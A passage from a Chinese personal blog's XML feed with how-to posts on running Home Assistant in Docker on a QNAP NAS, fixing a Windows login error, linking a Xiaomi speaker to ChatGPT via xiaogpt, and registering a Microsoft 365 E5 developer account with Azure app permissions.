        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>qnap 威联通 container station docker 安装 homeassistant</title>
    <url>/posts/60dd7089/</url>
    <content><![CDATA[<h1 id="一、在文件管理器上新建HomeAssistant的配置文件夹"><a href="#一、在文件管理器上新建HomeAssistant的配置文件夹" class="headerlink" title="一、在文件管理器上新建HomeAssistant的配置文件夹"></a>一、在文件管理器上新建HomeAssistant的配置文件夹</h1><p><img src="/img/homeassistant/1.webp" alt="v2-6748cfa52cf287562819fc499610fd90_1440w"><br>在NAS根目录新建共享文件夹 docker<br>在docker里新建文件夹homeassistant</p>
<h1 id="二、安装HomeAssistant"><a href="#二、安装HomeAssistant" class="headerlink" title="二、安装HomeAssistant"></a>二、安装HomeAssistant</h1><h2 id="1-打开App里面的Container-Station"><a href="#1-打开App里面的Container-Station" class="headerlink" title="1.打开App里面的Container Station"></a>1.打开App里面的Container Station</h2><p><img src="/img/homeassistant/2.webp" alt="v2-a9c138968404ac0ea33ec4ca0c40a6a1_1440w"></p>
<h2 id="2-安装HomeAssistant的镜像"><a href="#2-安装HomeAssistant的镜像" class="headerlink" title="2.安装HomeAssistant的镜像"></a>2.安装HomeAssistant的镜像</h2><p><img src="/img/homeassistant/3.webp" alt="v2-ce5d9aed1647931fe763b20afd42efaf_1440w"><br>选择homeassistant&#x2F;home-assistant的镜像，点击创建</p>
<h2 id="3-配置HomeAssistant"><a href="#3-配置HomeAssistant" class="headerlink" title="3. 配置HomeAssistant"></a>3. 配置HomeAssistant</h2><h3 id="3-1-CPU内存限制，可根据自己的实际资源情况调整"><a href="#3-1-CPU内存限制，可根据自己的实际资源情况调整" class="headerlink" title="3.1 CPU内存限制，可根据自己的实际资源情况调整"></a>3.1 CPU内存限制，可根据自己的实际资源情况调整</h3><p><img src="/img/homeassistant/4.webp" alt="v2-1d332ac12eaa74b67da8f167ced57834_1440w"><br><strong>CPU限制选50%，内存选1024M</strong></p>
<h3 id="3-2-环境变量设置"><a href="#3-2-环境变量设置" class="headerlink" title="3.2 环境变量设置"></a>3.2 环境变量设置</h3><p>高级设置——环境变量增加 <strong>TZ&#x3D;Asia&#x2F;Shanghai</strong> 即可，其它的会在创建容器后自行增加<br><img src="/img/homeassistant/5.webp" alt="v2-4a6a0313a864e238aff1c6125e89b159_1440w"></p>
<h3 id="3-3-主机模式选择Host模式"><a href="#3-3-主机模式选择Host模式" class="headerlink" title="3.3 主机模式选择Host模式"></a>3.3 主机模式选择Host模式</h3><p><img src="/img/homeassistant/6.webp" alt="v2-85497c2f277fc1f497c34cab30fea351_1440w"></p>
<h3 id="3-4-将容器的配置文件夹映射到本地，方便更改配置"><a href="#3-4-将容器的配置文件夹映射到本地，方便更改配置" class="headerlink" title="3.4 将容器的配置文件夹映射到本地，方便更改配置"></a>3.4 将容器的配置文件夹映射到本地，方便更改配置</h3><p><img src="/img/homeassistant/7.webp" alt="v2-a5559aa880ac3b4c5883f015116052e6_1440w"><br>共享文件夹——挂载本机共享文件夹——选 <strong>&#x2F;docker&#x2F;homeassistant</strong><br>挂载路径 <strong>&#x2F;config</strong></p>
<h3 id="3-5-点击Create，等待容器创建"><a href="#3-5-点击Create，等待容器创建" class="headerlink" title="3.5 点击Create，等待容器创建"></a>3.5 点击Create，等待容器创建</h3><h3 id="3-6-安装完毕"><a href="#3-6-安装完毕" class="headerlink" title="3.6 安装完毕"></a>3.6 安装完毕</h3><p>打开：威联通ip地址:8123&#x2F;<br>就能打开HomeAssistant的管理页面</p>
]]></content>
      <categories>
        <category>web</category>
        <category>os</category>
        <category>homeassistant</category>
        <category>qnap</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>homeassistant</tag>
        <tag>qnap</tag>
        <tag>nas</tag>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>qnap 威联通 docker homeassistant 安装 hacs, xiaomi miot 和 homekit</title>
    <url>/posts/5c5062d6/</url>
    <content><![CDATA[<h1 id="1-QNAP-FileStation文件总管-进去刚刚新建的共享文件夹-docker"><a href="#1-QNAP-FileStation文件总管-进去刚刚新建的共享文件夹-docker" class="headerlink" title="1. QNAP FileStation文件总管 进去刚刚新建的共享文件夹 docker"></a>1. QNAP FileStation文件总管 进去刚刚新建的共享文件夹 docker</h1><h1 id="2-进去-docker-里面的-homeassistant-文件夹"><a href="#2-进去-docker-里面的-homeassistant-文件夹" class="headerlink" title="2. 进去 docker 里面的 homeassistant 文件夹"></a>2. 进去 docker 里面的 homeassistant 文件夹</h1><h1 id="3-创建-www-和-custom-components-两个空文件夹"><a href="#3-创建-www-和-custom-components-两个空文件夹" class="headerlink" title="3. 创建 www 和 custom_components 两个空文件夹"></a>3. 创建 www 和 custom_components 两个空文件夹</h1><h1 id="4-hacs下载链接：https-github-com-hacs-integration-releases-把-hacs文件夹-拖到-custom-components-文件夹里"><a href="#4-hacs下载链接：https-github-com-hacs-integration-releases-把-hacs文件夹-拖到-custom-components-文件夹里" class="headerlink" title="4.hacs下载链接：https://github.com/hacs/integration/releases 把 hacs文件夹 拖到 custom_components 文件夹里"></a>4.hacs下载链接：<a href="https://github.com/hacs/integration/releases">https://github.com/hacs/integration/releases</a> 把 hacs文件夹 拖到 custom_components 文件夹里</h1><h1 id="5-在-homeassistant-配置和集成那里添加-hacs-插件"><a href="#5-在-homeassistant-配置和集成那里添加-hacs-插件" class="headerlink" title="5.在 homeassistant 配置和集成那里添加 hacs 插件"></a>5.在 homeassistant 配置和集成那里添加 hacs 插件</h1><h1 id="6-重启-homeassistant"><a href="#6-重启-homeassistant" class="headerlink" title="6.重启 homeassistant"></a>6.重启 homeassistant</h1><h1 id="7-安装-hacs"><a href="#7-安装-hacs" class="headerlink" title="7.安装 hacs"></a>7.安装 hacs</h1><h2 id="左下角配置——设备与服务——右下角添加集成——搜索hacs——勾选4个选项提交——复制授权码——跳转GitHub——粘贴代码授权——回到homeassistant给hacs选一个位置"><a href="#左下角配置——设备与服务——右下角添加集成——搜索hacs——勾选4个选项提交——复制授权码——跳转GitHub——粘贴代码授权——回到homeassistant给hacs选一个位置" class="headerlink" title="左下角配置——设备与服务——右下角添加集成——搜索hacs——勾选4个选项提交——复制授权码——跳转GitHub——粘贴代码授权——回到homeassistant给hacs选一个位置"></a>左下角配置——设备与服务——右下角添加集成——搜索hacs——勾选4个选项提交——复制授权码——跳转GitHub——粘贴代码授权——回到homeassistant给hacs选一个位置</h2><h1 id="8-安装-xiaomi-miot"><a href="#8-安装-xiaomi-miot" class="headerlink" title="8.安装 xiaomi miot"></a>8.安装 xiaomi miot</h1><h2 id="左边多了一个hacs——集成——右下角浏览并下载存储库——搜索xiaomi-miot下载——重启homeassistant——左下角配置——设备与服务——右下角添加集成——搜索xiaomi-miot——登录小米账户——就可以看到米家社备列表——添加设备进去homeassistant"><a href="#左边多了一个hacs——集成——右下角浏览并下载存储库——搜索xiaomi-miot下载——重启homeassistant——左下角配置——设备与服务——右下角添加集成——搜索xiaomi-miot——登录小米账户——就可以看到米家社备列表——添加设备进去homeassistant" class="headerlink" title="左边多了一个hacs——集成——右下角浏览并下载存储库——搜索xiaomi miot下载——重启homeassistant——左下角配置——设备与服务——右下角添加集成——搜索xiaomi miot——登录小米账户——就可以看到米家社备列表——添加设备进去homeassistant"></a>左边多了一个hacs——集成——右下角浏览并下载存储库——搜索xiaomi miot下载——重启homeassistant——左下角配置——设备与服务——右下角添加集成——搜索xiaomi miot——登录小米账户——就可以看到米家社备列表——添加设备进去homeassistant</h2><h1 id="9-安装-homekit"><a href="#9-安装-homekit" class="headerlink" title="9.安装 homekit"></a>9.安装 homekit</h1><h2 id="左下角配置——设备与服务——右下角添加集成——搜索homekit——配置提交——选择homeassistant容器所在位置——左下角通知——手机扫homekit二维码添加"><a href="#左下角配置——设备与服务——右下角添加集成——搜索homekit——配置提交——选择homeassistant容器所在位置——左下角通知——手机扫homekit二维码添加" class="headerlink" title="左下角配置——设备与服务——右下角添加集成——搜索homekit——配置提交——选择homeassistant容器所在位置——左下角通知——手机扫homekit二维码添加"></a>左下角配置——设备与服务——右下角添加集成——搜索homekit——配置提交——选择homeassistant容器所在位置——左下角通知——手机扫homekit二维码添加</h2>]]></content>
      <categories>
        <category>web</category>
        <category>os</category>
        <category>homeassistant</category>
        <category>qnap</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>homeassistant</tag>
        <tag>qnap</tag>
        <tag>nas</tag>
      </tags>
  </entry>
  <entry>
    <title>windows 10/11 出现0x80190001错误解决方案</title>
    <url>/posts/74512788/</url>
    <content><![CDATA[<h1 id="在Edge浏览器上登录账号的时候出现了0x80190001错误提示"><a href="#在Edge浏览器上登录账号的时候出现了0x80190001错误提示" class="headerlink" title="在Edge浏览器上登录账号的时候出现了0x80190001错误提示"></a>在Edge浏览器上登录账号的时候出现了0x80190001错误提示</h1><p>如果系统是Windows10&#x2F;11出现这样错误，初步判断可能是Windows的网络连接引起的问题，或者是系统当前网络的问题，也不完全排除系统bug。如出现账户无法登录，商店无法访问，个人账户无法验证同步等问题，试下以下修复方案：</p>
<h1 id="提示：如果当前系统正在用梯子等软件请先关闭！"><a href="#提示：如果当前系统正在用梯子等软件请先关闭！" class="headerlink" title="提示：如果当前系统正在用梯子等软件请先关闭！"></a>提示：如果当前系统正在用梯子等软件请先关闭！</h1><p>先尝试用输入命令来修复，步骤如下：</p>
<h1 id="1-打开Windows搜索（快捷键win-s）框输入CMD，会出现命令提示符，右键以管理员身份运行；"><a href="#1-打开Windows搜索（快捷键win-s）框输入CMD，会出现命令提示符，右键以管理员身份运行；" class="headerlink" title="1.打开Windows搜索（快捷键win+s）框输入CMD，会出现命令提示符，右键以管理员身份运行；"></a>1.打开Windows搜索（快捷键win+s）框输入CMD，会出现命令提示符，右键以管理员身份运行；</h1><h1 id="2-在命令框内输入netsh-int-ip-reset回车，接着再输入命令netsh-winsock-reset回车来重置网络，最后重启电脑即可，部分电脑可以恢复，如果还是出现了0x80190001错误提示继续以下步骤。"><a href="#2-在命令框内输入netsh-int-ip-reset回车，接着再输入命令netsh-winsock-reset回车来重置网络，最后重启电脑即可，部分电脑可以恢复，如果还是出现了0x80190001错误提示继续以下步骤。" class="headerlink" title="2.在命令框内输入netsh int ip reset回车，接着再输入命令netsh winsock reset回车来重置网络，最后重启电脑即可，部分电脑可以恢复，如果还是出现了0x80190001错误提示继续以下步骤。"></a>2.在命令框内输入netsh int ip reset回车，接着再输入命令netsh winsock reset回车来重置网络，最后重启电脑即可，部分电脑可以恢复，如果还是出现了0x80190001错误提示继续以下步骤。</h1><h2 id="步骤1：右键网络，点击属性，点击所连接的网络，并点击属性"><a href="#步骤1：右键网络，点击属性，点击所连接的网络，并点击属性" class="headerlink" title="步骤1：右键网络，点击属性，点击所连接的网络，并点击属性"></a>步骤1：右键网络，点击属性，点击所连接的网络，并点击属性</h2><h2 id="步骤2：打开后，勾选Internet-协议版本4-TCP-IPv4-并双击，勾选使用下面的DNS服务器地址"><a href="#步骤2：打开后，勾选Internet-协议版本4-TCP-IPv4-并双击，勾选使用下面的DNS服务器地址" class="headerlink" title="步骤2：打开后，勾选Internet 协议版本4 (TCP&#x2F;IPv4)并双击，勾选使用下面的DNS服务器地址"></a>步骤2：打开后，勾选Internet 协议版本4 (TCP&#x2F;IPv4)并双击，勾选使用下面的DNS服务器地址</h2><p>首选DNS 4.2.2.1<br>备用DNS 4.2.2.2</p>
<h1 id="步骤3：返回到网络和共享中心，点击左下角Internet-选项，选择高级，点击重置（勾选删除个人设置）并确认重置即可："><a href="#步骤3：返回到网络和共享中心，点击左下角Internet-选项，选择高级，点击重置（勾选删除个人设置）并确认重置即可：" class="headerlink" title="步骤3：返回到网络和共享中心，点击左下角Internet 选项，选择高级，点击重置（勾选删除个人设置）并确认重置即可："></a>步骤3：返回到网络和共享中心，点击左下角Internet 选项，选择高级，点击重置（勾选删除个人设置）并确认重置即可：</h1><h1 id="最后，重启电脑0x80190001错误就解决啦！"><a href="#最后，重启电脑0x80190001错误就解决啦！" class="headerlink" title="最后，重启电脑0x80190001错误就解决啦！"></a>最后，重启电脑0x80190001错误就解决啦！</h1>]]></content>
      <categories>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>小爱同学接入chatgpt</title>
    <url>/posts/eb423fb7/</url>
    <content><![CDATA[<h1 id="自备梯子，配置系统代理（针对国内环境，外国不需要）"><a href="#自备梯子，配置系统代理（针对国内环境，外国不需要）" class="headerlink" title="自备梯子，配置系统代理（针对国内环境，外国不需要）"></a>自备梯子，配置系统代理（针对国内环境，外国不需要）</h1><h2 id="windows（注意端口，例7890）"><a href="#windows（注意端口，例7890）" class="headerlink" title="windows（注意端口，例7890）"></a>windows（注意端口，例7890）</h2><p>powershell命令行设置代理：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Env:http_proxy</span>=<span class="string">&quot;http://127.0.0.1:7890&quot;</span>;<span class="variable">$Env:https_proxy</span>=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure>
<p>cmd命令行设置代理：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> http_proxy=http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7890</span> &amp; <span class="built_in">set</span> https_proxy=http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">7890</span></span><br></pre></td></tr></table></figure>
<h2 id="macos-linux（注意端口，例7890）"><a href="#macos-linux（注意端口，例7890）" class="headerlink" title="macos&#x2F;linux（注意端口，例7890）"></a>macos&#x2F;linux（注意端口，例7890）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890 https_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
<h1 id="yihong0618-xiaogpt-https-github-com-yihong0618-xiaogpt"><a href="#yihong0618-xiaogpt-https-github-com-yihong0618-xiaogpt" class="headerlink" title="yihong0618&#x2F;xiaogpt https://github.com/yihong0618/xiaogpt"></a>yihong0618&#x2F;xiaogpt <a href="https://github.com/yihong0618/xiaogpt">https://github.com/yihong0618/xiaogpt</a></h1><h2 id="新建项目文件夹，下载代码"><a href="#新建项目文件夹，下载代码" class="headerlink" title="新建项目文件夹，下载代码"></a>新建项目文件夹，下载代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yihong0618/xiaogpt.git</span><br></pre></td></tr></table></figure>
<h2 id="进去项目文件夹里的xiaogpt文件夹，安装依赖文件"><a href="#进去项目文件夹里的xiaogpt文件夹，安装依赖文件" class="headerlink" title="进去项目文件夹里的xiaogpt文件夹，安装依赖文件"></a>进去项目文件夹里的xiaogpt文件夹，安装依赖文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -U --force-reinstall xiaogpt</span><br></pre></td></tr></table></figure>
<h1 id="yihong0618-MiService-https-github-com-yihong0618-MiService"><a href="#yihong0618-MiService-https-github-com-yihong0618-MiService" class="headerlink" title="yihong0618&#x2F;MiService https://github.com/yihong0618/MiService"></a>yihong0618&#x2F;MiService <a href="https://github.com/yihong0618/MiService">https://github.com/yihong0618/MiService</a></h1><h2 id="在项目文件夹，下载代码"><a href="#在项目文件夹，下载代码" class="headerlink" title="在项目文件夹，下载代码"></a>在项目文件夹，下载代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yihong0618/MiService.git</span><br></pre></td></tr></table></figure>

<h2 id="进去项目文件夹里的MiService文件夹，安装依赖"><a href="#进去项目文件夹里的MiService文件夹，安装依赖" class="headerlink" title="进去项目文件夹里的MiService文件夹，安装依赖"></a>进去项目文件夹里的MiService文件夹，安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install .</span><br></pre></td></tr></table></figure>
<h2 id="录入小米账号密码"><a href="#录入小米账号密码" class="headerlink" title="录入小米账号密码"></a>录入小米账号密码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> MI_USER=&lt;Username&gt;</span><br><span class="line"><span class="built_in">export</span> MI_PASS=&lt;Password&gt;</span><br></pre></td></tr></table></figure>
<h2 id="查询自己的设备"><a href="#查询自己的设备" class="headerlink" title="查询自己的设备"></a>查询自己的设备</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">micli.py list</span><br></pre></td></tr></table></figure>
<p>可以显示自己账号下的设备列表，包含名称、类型、DID、Token 等信息。</p>
<h2 id="设置-Device-ID（来自上面这条命令的结果）"><a href="#设置-Device-ID（来自上面这条命令的结果）" class="headerlink" title="设置 Device ID（来自上面这条命令的结果）"></a>设置 Device ID（来自上面这条命令的结果）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> MI_DID=&lt;Device ID|Name&gt;</span><br></pre></td></tr></table></figure>
<h1 id="acheong08-ChatGPT-https-github-com-acheong08-ChatGPT-v3-official-chat-api"><a href="#acheong08-ChatGPT-https-github-com-acheong08-ChatGPT-v3-official-chat-api" class="headerlink" title="acheong08&#x2F;ChatGPT https://github.com/acheong08/ChatGPT#v3-official-chat-api"></a>acheong08&#x2F;ChatGPT <a href="https://github.com/acheong08/ChatGPT#v3-official-chat-api">https://github.com/acheong08/ChatGPT#v3-official-chat-api</a></h1><h2 id="进去项目文件夹里的xiaogpt文件夹"><a href="#进去项目文件夹里的xiaogpt文件夹" class="headerlink" title="进去项目文件夹里的xiaogpt文件夹"></a>进去项目文件夹里的xiaogpt文件夹</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade revChatGPT</span><br></pre></td></tr></table></figure>
<h2 id="配置-chatgpt-api-key"><a href="#配置-chatgpt-api-key" class="headerlink" title="配置 chatgpt api key"></a>配置 chatgpt api key</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m revChatGPT.V3 --api_key &lt;api_key&gt;</span><br></pre></td></tr></table></figure>
<p><a href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a></p>
<h2 id="屏蔽小爱同学回答（注意型号，例LX06）"><a href="#屏蔽小爱同学回答（注意型号，例LX06）" class="headerlink" title="屏蔽小爱同学回答（注意型号，例LX06）"></a>屏蔽小爱同学回答（注意型号，例LX06）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面的$&#123;your_api_key&#125;填写api_key</span></span><br><span class="line"><span class="built_in">export</span> OPENAI_API_KEY=<span class="variable">$&#123;your_api_key&#125;</span></span><br><span class="line"><span class="comment">#运行xiaogpt.py这个python文件</span></span><br><span class="line">python3 xiaogpt.py --hardware LX06  --mute_xiaoai --use_gpt3 --mute_xiaoai</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
        <category>xiaogpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
        <tag>xiaogpt</tag>
      </tags>
  </entry>
  <entry>
    <title>微软e5账户注册 microsoft365，申请5t onedrive，自动续期</title>
    <url>/posts/75823327/</url>
    <content><![CDATA[<h1 id="E5申请链接-https-developer-microsoft-com-en-us-microsoft-365-dev-program"><a href="#E5申请链接-https-developer-microsoft-com-en-us-microsoft-365-dev-program" class="headerlink" title="E5申请链接 https://developer.microsoft.com/en-us/microsoft-365/dev-program"></a>E5申请链接 <a href="https://developer.microsoft.com/en-us/microsoft-365/dev-program">https://developer.microsoft.com/en-us/microsoft-365/dev-program</a></h1><p>选择所在的国家或地区<br>使用浏览器隐私模式（推荐edge chromium版）</p>
<h1 id="5T的网盘申请-https-macinko-admin-sharepoint-com-layouts-15-online-AdminHome-aspx-modern-true-home"><a href="#5T的网盘申请-https-macinko-admin-sharepoint-com-layouts-15-online-AdminHome-aspx-modern-true-home" class="headerlink" title="5T的网盘申请 https://macinko-admin.sharepoint.com/_layouts/15/online/AdminHome.aspx?modern=true#/home"></a>5T的网盘申请 <a href="https://macinko-admin.sharepoint.com/_layouts/15/online/AdminHome.aspx?modern=true#/home">https://macinko-admin.sharepoint.com/_layouts/15/online/AdminHome.aspx?modern=true#/home</a></h1><p>登陆用 <a href="mailto:&#120;&#120;&#120;&#64;&#120;&#120;&#x78;&#46;&#111;&#110;&#109;&#x69;&#x63;&#x72;&#111;&#115;&#x6f;&#102;&#116;&#46;&#99;&#x6f;&#109;">&#120;&#120;&#120;&#64;&#120;&#120;&#x78;&#46;&#111;&#110;&#109;&#x69;&#x63;&#x72;&#111;&#115;&#x6f;&#102;&#116;&#46;&#99;&#x6f;&#109;</a> 账户</p>
<h1 id="创建子账户-https-admin-microsoft-com-Adminportal-Home-homepage"><a href="#创建子账户-https-admin-microsoft-com-Adminportal-Home-homepage" class="headerlink" title="创建子账户 https://admin.microsoft.com/Adminportal/Home#/homepage"></a>创建子账户 <a href="https://admin.microsoft.com/Adminportal/Home#/homepage">https://admin.microsoft.com/Adminportal/Home#/homepage</a></h1><h1 id="自动续期-获取自己的api-key-https-portal-azure-com-blade-Microsoft-AAD-IAM-ActiveDirectoryMenuBlade-RegisteredApps"><a href="#自动续期-获取自己的api-key-https-portal-azure-com-blade-Microsoft-AAD-IAM-ActiveDirectoryMenuBlade-RegisteredApps" class="headerlink" title="自动续期 获取自己的api key https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps"></a>自动续期 获取自己的api key <a href="https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps">https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/RegisteredApps</a></h1><h1 id="注册Azure应用程序"><a href="#注册Azure应用程序" class="headerlink" title="注册Azure应用程序"></a>注册Azure应用程序</h1><h2 id="1-应用注册"><a href="#1-应用注册" class="headerlink" title="1.应用注册"></a>1.应用注册</h2><p>点击登录 Azure或点击直接进入Azure应用注册，登录账号使用申请到的Microsoft 365 E5的管理员账户（账户名类似<a href="mailto:&#x58;&#88;&#x58;&#x58;&#x40;&#x59;&#x59;&#89;&#x59;&#x2e;&#x6f;&#110;&#x6d;&#x69;&#99;&#114;&#111;&#x73;&#x6f;&#x66;&#x74;&#46;&#99;&#111;&#x6d;">&#x58;&#88;&#x58;&#x58;&#x40;&#x59;&#x59;&#89;&#x59;&#x2e;&#x6f;&#110;&#x6d;&#x69;&#99;&#114;&#111;&#x73;&#x6f;&#x66;&#x74;&#46;&#99;&#111;&#x6d;</a>格式）。</p>
<h2 id="2-登录完成后点击右上角的“门户”按钮进入Azure管理中心，在搜索栏内输入“应用注册”，点击进入（若应用注册搜索不到请点击此处直接进入）。"><a href="#2-登录完成后点击右上角的“门户”按钮进入Azure管理中心，在搜索栏内输入“应用注册”，点击进入（若应用注册搜索不到请点击此处直接进入）。" class="headerlink" title="2.登录完成后点击右上角的“门户”按钮进入Azure管理中心，在搜索栏内输入“应用注册”，点击进入（若应用注册搜索不到请点击此处直接进入）。"></a>2.登录完成后点击右上角的“门户”按钮进入Azure管理中心，在搜索栏内输入“应用注册”，点击进入（若应用注册搜索不到请点击此处直接进入）。</h2><p><img src="/img/e5/1.webp" alt="20200618170032256"></p>
<h2 id="3-单击“新注册”按钮"><a href="#3-单击“新注册”按钮" class="headerlink" title="3.单击“新注册”按钮"></a>3.单击“新注册”按钮</h2><p><img src="/img/e5/2.webp" alt="2020061817051341"></p>
<h2 id="4-配置应用-应用名称随意写、注意可访问性选项选择最后一项、重定向URL暂时不填-、完成后点击注册"><a href="#4-配置应用-应用名称随意写、注意可访问性选项选择最后一项、重定向URL暂时不填-、完成后点击注册" class="headerlink" title="4.配置应用 应用名称随意写、注意可访问性选项选择最后一项、重定向URL暂时不填 、完成后点击注册"></a>4.配置应用 应用名称随意写、注意可访问性选项选择最后一项、重定向URL暂时不填 、完成后点击注册</h2><p><img src="/img/e5/3.webp" alt="20200618170801323"></p>
<h2 id="5-配置应用重定向URL（身份验证）"><a href="#5-配置应用重定向URL（身份验证）" class="headerlink" title="5.配置应用重定向URL（身份验证）"></a>5.配置应用重定向URL（身份验证）</h2><h2 id="6-先点击“概述”，然后点击“添加重定向URL”，进入重定向URL配置界面，下图中的应用程序-客户端-ID即为”客户端ID”。"><a href="#6-先点击“概述”，然后点击“添加重定向URL”，进入重定向URL配置界面，下图中的应用程序-客户端-ID即为”客户端ID”。" class="headerlink" title="6.先点击“概述”，然后点击“添加重定向URL”，进入重定向URL配置界面，下图中的应用程序(客户端)ID即为”客户端ID”。"></a>6.先点击“概述”，然后点击“添加重定向URL”，进入重定向URL配置界面，下图中的应用程序(客户端)ID即为”客户端ID”。</h2><p><img src="/img/e5/4.webp" alt="2020061817121972"></p>
<h2 id="7-点击“添加平台”，再点击“移动和桌面应用程序”，"><a href="#7-点击“添加平台”，再点击“移动和桌面应用程序”，" class="headerlink" title="7.点击“添加平台”，再点击“移动和桌面应用程序”，"></a>7.点击“添加平台”，再点击“移动和桌面应用程序”，</h2><p><img src="/img/e5/5.webp" alt="20200618171501396"></p>
<h2 id="8-继续勾选中第一个URL，最后点击底部的“配置”"><a href="#8-继续勾选中第一个URL，最后点击底部的“配置”" class="headerlink" title="8.继续勾选中第一个URL，最后点击底部的“配置”"></a>8.继续勾选中第一个URL，最后点击底部的“配置”</h2><p><img src="/img/e5/6.webp" alt="20200618171651338"></p>
<h2 id="9-配置默认客户端类型将应用程序视为公共客户端-点击切换按钮为“是”-，最后点击“保存”按钮保存。"><a href="#9-配置默认客户端类型将应用程序视为公共客户端-点击切换按钮为“是”-，最后点击“保存”按钮保存。" class="headerlink" title="9.配置默认客户端类型将应用程序视为公共客户端 点击切换按钮为“是” ，最后点击“保存”按钮保存。"></a>9.配置默认客户端类型将应用程序视为公共客户端 点击切换按钮为“是” ，最后点击“保存”按钮保存。</h2><p><img src="/img/e5/7.webp" alt="20200618171850779"></p>
<h2 id="10-配置应用程序的API权限（重要）"><a href="#10-配置应用程序的API权限（重要）" class="headerlink" title="10.配置应用程序的API权限（重要）"></a>10.配置应用程序的API权限（重要）</h2><p>小白提示：建议选择“委托的权限(用户登录)”该权限类型，调用API较多，操作步骤较少简单粗暴，调用成功几率高</p>
<h2 id="11-选择“应用程序权限-非用户登录-”类型的API"><a href="#11-选择“应用程序权限-非用户登录-”类型的API" class="headerlink" title="11.选择“应用程序权限(非用户登录)”类型的API"></a>11.选择“应用程序权限(非用户登录)”类型的API</h2><h2 id="12-点击“API权限”-“添加权限”-“Microsoft-Graph”"><a href="#12-点击“API权限”-“添加权限”-“Microsoft-Graph”" class="headerlink" title="12.点击“API权限”-“添加权限”-“Microsoft Graph”"></a>12.点击“API权限”-“添加权限”-“Microsoft Graph”</h2><p><img src="/img/e5/8.webp" alt="2020061819283823-1682047933023"></p>
<h2 id="13-选择“应用程序权限”"><a href="#13-选择“应用程序权限”" class="headerlink" title="13.选择“应用程序权限”"></a>13.选择“应用程序权限”</h2><p><img src="/img/e5/9.webp" alt="20200801120027971"></p>
<h2 id="14-根据编辑页面中列出的API权限需求表（注意在程序中切换为”非登录“）来勾选所对应的API权限，全部选择完成后点击”添加权限”。"><a href="#14-根据编辑页面中列出的API权限需求表（注意在程序中切换为”非登录“）来勾选所对应的API权限，全部选择完成后点击”添加权限”。" class="headerlink" title="14.根据编辑页面中列出的API权限需求表（注意在程序中切换为”非登录“）来勾选所对应的API权限，全部选择完成后点击”添加权限”。"></a>14.根据编辑页面中列出的API权限需求表（注意在程序中切换为”非登录“）来勾选所对应的API权限，全部选择完成后点击”添加权限”。</h2><p><img src="/img/e5/10.webp" alt="20200618172627969-1682047963555"><br>添加完成的效果如图<br>如果没有“代表XXX授予管理员同意”按钮 说明该账号不是管理员账号 换登管理员账号创建应用<br><img src="/img/e5/11.webp" alt="20200801120623311"></p>
<h2 id="15-最后点击代表XXX授予管理员同意-对话框选择“是”（该图包含了当前程序“应用程序权限-非用户登录-”全部API所需要的权限）。"><a href="#15-最后点击代表XXX授予管理员同意-对话框选择“是”（该图包含了当前程序“应用程序权限-非用户登录-”全部API所需要的权限）。" class="headerlink" title="15.最后点击代表XXX授予管理员同意,对话框选择“是”（该图包含了当前程序“应用程序权限(非用户登录)”全部API所需要的权限）。"></a>15.最后点击代表XXX授予管理员同意,对话框选择“是”（该图包含了当前程序“应用程序权限(非用户登录)”全部API所需要的权限）。</h2><p><img src="/img/e5/12.webp" alt="20200801120818260"></p>
<h2 id="16-创建客户端密码"><a href="#16-创建客户端密码" class="headerlink" title="16.创建客户端密码"></a>16.创建客户端密码</h2><h2 id="17-点击“证书密码”-“新客户端密码”-“24个月”-“添加”"><a href="#17-点击“证书密码”-“新客户端密码”-“24个月”-“添加”" class="headerlink" title="17.点击“证书密码”-“新客户端密码”-“24个月”-“添加”"></a>17.点击“证书密码”-“新客户端密码”-“24个月”-“添加”</h2><p><img src="/img/e5/13.webp" alt="20210609101116972"></p>
